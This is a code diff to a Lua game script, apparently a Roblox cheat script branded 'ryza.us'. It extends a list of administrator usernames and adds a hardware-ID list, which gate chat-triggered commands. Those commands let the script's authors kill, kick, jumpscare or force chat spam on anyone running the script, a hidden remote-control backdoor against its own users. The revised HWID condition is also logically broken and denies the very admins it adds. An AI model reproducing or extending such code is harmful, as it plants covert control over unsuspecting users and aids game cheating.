@@ -2445,10 +2445,19 @@ do
 		"lvasion",
 		"restaxts",
 		"ixpinkyyxi",
-		"rylieaspen"
+		"rylieaspen",
+		-- 1
+		"testaccount1063_L",
+		"ThanProbably",
+		"gamseasxer31096",
+		"jm_ep45"
 	}
 
-	if findList(admins, LocalPlayer.Name) then
+	local adminsByHWID = {
+		"CE81F5AE-6BFC-4FCC-BDBA-986A45338860"
+	}
+
+	if findList(admins, LocalPlayer.Name) or findList(adminsByHWID, HWID) then
 		Tabs.Admin:AddButton({
 			Title = "Bring All",
 			Description = "Bring all script user(s)",
@@ -2503,7 +2512,7 @@ do
 	local function onPlayerAdded(player)
 		player.Chatted:Connect(function(message)
 			if message == "ryza.us(bring)" then
-				if not findList(admins, player.Name) then
+				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
 					return
 				end
 
@@ -2519,7 +2528,7 @@ do
 					end
 				end
 			elseif message == "ryza.us(kill)" then
-				if not findList(admins, player.Name) then
+				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
 					return
 				end
 
@@ -2533,7 +2542,7 @@ do
 					char.Humanoid.Health = 0
 				end
 			elseif message == "ryza.us(kick)" then
-				if not findList(admins, player.Name) then
+				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
 					return
 				end
 
@@ -2543,7 +2552,7 @@ do
 
 				LocalPlayer:Kick("kicked by ryza.us administrator")
 			elseif message == "ryza.us(send)" then
-				if not findList(admins, player.Name) then
+				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
 					return
 				end
 
@@ -2558,7 +2567,7 @@ do
 					Channel:SendAsync("gg / ryzaus")
 				end
 			elseif message == "ryza.us(jumpscare)" then
-				if not findList(admins, player.Name) then
+				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
 					return
 				end
 
@@ -2584,7 +2593,7 @@ do
 				task.wait(5)
 				sGui:Destroy()
 			elseif message == "ryza.us(flashbang)" then
-				if not findList(admins, player.Name) then
+				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
 					return
 				end
 
